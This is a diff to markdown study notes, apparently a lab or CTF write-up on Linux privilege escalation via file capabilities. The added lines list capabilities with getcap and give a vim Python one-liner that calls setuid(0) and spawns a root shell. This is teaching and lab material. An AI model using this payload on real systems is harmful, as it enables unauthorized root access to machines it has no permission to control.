@@ -292,7 +292,12 @@ Capabilities help manage privileges at a more granular level.
 <summaty>details</summary>
 Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
 The capabilities man page provides detailed information on its usage and options.
-</details>
+</details>  
 
+We can use the `getcap` tool to list enabled capabilities.  
+`getcap -r / 2>/dev/null`: 
+<img src="https://user-images.githubusercontent.com/73976100/224457735-9470b2ac-a3f6-46ad-8a0e-a535a636d2d1.png" width="600">  
+[GTFObins](https://gtfobins.github.io/#+Capabilities) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
+We notice that vim can be used with the following command and payload:
 
-
+`./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
